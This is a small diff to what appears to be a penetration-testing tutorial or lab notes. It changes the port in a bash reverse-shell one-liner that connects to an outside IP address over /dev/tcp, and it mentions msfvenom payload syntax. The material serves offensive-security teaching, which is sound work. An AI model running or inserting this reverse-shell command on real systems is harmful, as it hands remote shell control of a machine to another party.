@@ -27,7 +27,7 @@ Or we can use:
 
 ```bash
  #!/bin/bash  
- bash -i >& /dev/tcp/10.2.54.112/4445 0>&1
+ bash -i >& /dev/tcp/10.2.54.112/4444 0>&1
 ```
 
  or we can use msfvenom to generate a payload, noting that the syntax should be in this format `msfvenom -p <PAYLOAD> <OPTIONS>`, and the naming convention for the payload should be like this `<OS>/<arch>/<payload>`.:
